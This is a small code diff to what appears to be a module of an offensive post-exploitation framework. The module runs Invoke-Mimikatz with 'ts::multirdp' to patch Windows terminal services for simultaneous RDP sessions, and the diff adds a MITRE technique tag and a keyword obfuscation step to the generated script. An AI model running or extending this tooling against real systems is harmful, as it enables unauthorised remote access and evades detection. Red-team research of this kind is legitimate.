@@ -1,7 +1,10 @@
 from __future__ import print_function
-from builtins import str
+
 from builtins import object
+from builtins import str
+
 from lib.common import helpers
+
 
 class Module(object):
 
@@ -15,6 +18,10 @@ class Module(object):
             'Description': ("[!] WARNING: Experimental! Runs PowerSploit's Invoke-Mimikatz "
                             "function to patch the Windows terminal service to allow "
                             "multiple users to establish simultaneous RDP connections."),
+
+            'Software': '',
+
+            'Techniques': ['T1076'],
 
             'Background' : True,
 
@@ -75,7 +82,10 @@ class Module(object):
         script = moduleCode
 
         scriptEnd = "Invoke-Mimikatz -Command '\"ts::multirdp\"';"
+
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
+
         return script
